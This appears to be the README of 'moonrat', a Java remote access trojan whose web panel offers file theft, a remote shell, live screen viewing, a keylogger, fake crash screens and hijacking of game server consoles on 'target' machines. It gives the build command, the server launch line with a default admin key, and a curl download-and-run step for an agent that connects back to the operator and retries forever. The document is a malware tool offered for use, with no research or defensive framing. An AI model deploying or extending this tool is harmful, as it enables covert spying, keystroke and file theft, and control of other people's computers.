# moonrat

basic rat written in java. one jar for the agent, one process for the server, web panel for you. if the box runs a jre, it can probably run this.

## what you get

- **file browser** — list, download, upload, zip any folder on the target
- **shell** — run commands, get stdout back
- **screen** — live mjpeg stream, quality/fps presets, fullscreen on double click
- **keylogger** — start/stop, pull the dump whenever
- **fun tab** — bsod, sounds, toast notifications for windows targets
- **game console** — auto-detects pterodactyl / minecraft server processes, lets you type into the server console (op yourself, duh), tail the log, drop plugins into the plugins folder
- **access keys** — admin and operator roles, hand out limited keys so your boys dont get root access to your panel

## how it works

the agent dials home over raw tcp and everything rides inside an aes-256-gcm encrypted frame protocol, so the channel key is what matters. the server runs a web panel over plain http and self-signed https on top. your browser never talks to the agent directly, the server relays.

every agent gets fingerprinted on connect — os, user, host, and env (pterodactyl container / headless linux / desktop), shown as a badge in the rail.

## build

    ./build.sh

drops compiled classes plus `out/moonrat-agent.jar` — thats your payload, its self-contained.

## run the server

    java -cp out moonrat.server.MoonRAT <http-port> <agent-port> <channel-key> <https-port>

like this:

    java -cp out moonrat.server.MoonRAT 8080 4444 s3cret 8443

open `http://127.0.0.1:8080`. default admin key is `parol123@@` — its sitting in `moonrat.keys`, go change it.

## deploy the agent

any box with java:

    curl -sL <your-link> -o agent.jar
    java -jar agent.jar <server-ip> 4444 s3cret

if the server is unreachable it just retries every 5 seconds forever, so you can start it before the server exists.

## notes

- `moonrat.keys` and `certs/` are yours alone, dont commit them anywhere
- screen streaming needs a display on the target, headless machines just error out on that tab, everything else works
- the game console hook is linux only, it talks to the game server through `/proc/<pid>/fd/0` and reads `logs/latest.log`
